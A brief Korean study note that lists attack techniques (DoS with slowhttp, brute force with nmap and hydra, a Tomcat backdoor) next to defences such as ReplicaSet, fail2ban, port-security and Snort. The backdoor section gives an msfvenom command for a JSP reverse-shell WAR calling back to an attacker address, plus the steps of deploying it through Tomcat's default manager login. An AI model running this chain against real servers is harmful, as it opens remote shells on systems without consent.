# 공격기법: DOS공격
## 공격툴: slowhttp in kali-linux-2025
# 대응방법: fault tolerence
## 방어툴: k8s의 replicaset 기능 
---
# 공격기법: Brute Force Attack (무차별 대입 공격)
## 공격툴: HUB(device), nmap&hydra in kali-linux-2025
# 대응방법: IDS(snort), IPS(fail2ban, port-security)
## 방어툴1: IPS(port-security)
## 방어툴2: IPS(fail2ban)
## 방어툴3: IDS(snort)
---
# 공격기법: Backdoor
## 공격툴: nmap&msfvenom in kali-linux-2025
kalilinux-2025 안에서 명령어 3줄이면 ReverseShell 파일을 심는 Malware 공격할 수 있다. 단, ApacheTomcat 생서 처음에만 먹히는 공격이다. 초기 비밀번호를 잘 관리하면 방어할 수 있다. \
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<공격자 IP 주소> LPORT=4444 -f war > shell.wa \
nmap -sV -sC <타겟 IP 주소> \
tomcat 으로 기본값으로 manager 로그인 시도 \
http://<타겟 IP>:8080/shell/ 실행됨
